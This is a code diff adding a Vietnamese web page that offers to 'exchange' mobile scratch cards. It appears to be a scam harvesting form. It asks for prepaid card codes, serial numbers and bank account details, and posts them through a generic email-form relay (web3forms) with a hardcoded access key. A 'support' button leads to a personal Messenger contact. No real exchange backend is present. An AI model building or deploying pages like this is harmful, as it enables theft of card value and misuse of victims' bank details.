@@ -1,0 +1,221 @@
+<!doctype html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Đổi thẻ cào</title>
+
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #5b2cff, #8b5cf6);
+      min-height: 100vh;
+      padding: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 480px;
+      background: #fff;
+      border-radius: 22px;
+      padding: 24px;
+      box-shadow: 0 18px 45px rgba(0,0,0,0.18);
+    }
+
+    h1 {
+      margin: 0;
+      text-align: center;
+      font-size: 24px;
+      color: #2d145f;
+    }
+
+    .desc {
+      text-align: center;
+      color: #666;
+      font-size: 14px;
+      margin: 10px 0 22px;
+    }
+
+    label {
+      display: block;
+      font-size: 14px;
+      font-weight: 700;
+      margin: 14px 0 6px;
+    }
+
+    input, select, textarea {
+      width: 100%;
+      border: 1px solid #ddd;
+      border-radius: 12px;
+      padding: 13px;
+      font-size: 15px;
+      background: #fafafa;
+      outline: none;
+    }
+
+    input:focus, select:focus, textarea:focus {
+      border-color: #6d3cff;
+      background: #fff;
+    }
+
+    textarea {
+      resize: none;
+      min-height: 80px;
+    }
+
+    .notice {
+      margin-top: 16px;
+      padding: 13px;
+      background: #fff7ed;
+      border: 1px solid #fed7aa;
+      color: #9a3412;
+      border-radius: 14px;
+      font-size: 13px;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 18px;
+      border: none;
+      border-radius: 14px;
+      padding: 15px;
+      font-size: 16px;
+      font-weight: 700;
+      color: #fff;
+      background: linear-gradient(135deg, #5b2cff, #7c3aed);
+      cursor: pointer;
+    }
+
+    .support-btn {
+      background: linear-gradient(135deg, #10b981, #059669);
+    }
+
+    .success, .error {
+      display: none;
+      margin-top: 14px;
+      padding: 13px;
+      border-radius: 14px;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    .success {
+      background: #ecfdf5;
+      border: 1px solid #bbf7d0;
+      color: #166534;
+    }
+
+    .error {
+      background: #fef2f2;
+      border: 1px solid #fecaca;
+      color: #991b1b;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="card">
+    <h1>Đổi thẻ cào</h1>
+    <p class="desc">Gửi thông tin để được kiểm tra và xử lý</p>
+
+    <form id="form">
+      <input type="hidden" name="access_key" value="691f6507-fd6f-4d2c-a85c-ae34f3432aa0">
+
+      <label>Loại thẻ</label>
+      <select name="Loại thẻ" required>
+        <option value="">Chọn loại thẻ</option>
+        <option>Viettel</option>
+        <option>Vinaphone</option>
+        <option>Mobifone</option> 
+        <option>Vietnammobile</option> 
+      </select>
+
+      <label>Mệnh giá</label>
+      <select name="Mệnh giá" required>
+        <option value="">Chọn mệnh giá</option>
+        <option>200.000đ</option>
+        <option>500.000đ</option>
+        <option>1.000.000đ</option>
+      </select>
+
+      <label>Mã thẻ</label>
+      <input name="Mã thẻ" required placeholder="Nhập mã thẻ">
+
+      <label>Số seri</label>
+      <input name="Số seri" required placeholder="Nhập số seri">
+
+      <label>Ngân hàng</label>
+      <input name="Ngân hàng" required placeholder="VD: MB Bank, Vietcombank">
+
+      <label>Số tài khoản</label>
+      <input name="Số tài khoản" required>
+
+      <label>Chủ tài khoản</label>
+      <input name="Chủ tài khoản" required>
+
+      <label>Ghi chú</label>
+      <textarea name="Ghi chú"></textarea>
+
+      <div class="notice">
+       ⚠️ LƯU Ý: Hệ thống chỉ xử lý thẻ hợp lệ, không hỗ trợ thẻ sai.
+
+Mọi yêu cầu trợ giúp hoặc giải đáp thắc mắc, vui lòng truy cập mục Hỗ trợ để liên hệ nhân viên phụ trách: Lê Hồng Đức.
+      </div>
+
+      <button type="submit">Gửi yêu cầu</button>
+
+      <!-- NÚT HỖ TRỢ -->
+      <button type="button" class="support-btn" onclick="goSupport()">
+        Hỗ trợ
+      </button>
+
+      <div class="success" id="success">Gửi thành công!</div>
+      <div class="error" id="error">Có lỗi xảy ra!</div>
+    </form>
+  </div>
+
+  <script>
+    const form = document.getElementById("form");
+    const success = document.getElementById("success");
+    const error = document.getElementById("error");
+
+    form.addEventListener("submit", async function(e) {
+      e.preventDefault();
+
+      success.style.display = "none";
+      error.style.display = "none";
+
+      const formData = new FormData(form);
+
+      try {
+        const res = await fetch("https://api.web3forms.com/submit", {
+          method: "POST",
+          body: formData
+        });
+
+        const data = await res.json();
+
+        if (data.success) {
+          success.style.display = "block";
+          form.reset();
+        } else {
+          error.style.display = "block";
+        }
+      } catch {
+        error.style.display = "block";
+      }
+    });
+
+    // CHUYỂN LINK HỖ TRỢ
+    function goSupport() {
+      window.location.href = "https://m.me/61586617287838";
+    }
+  </script>
+</body>
+</html>
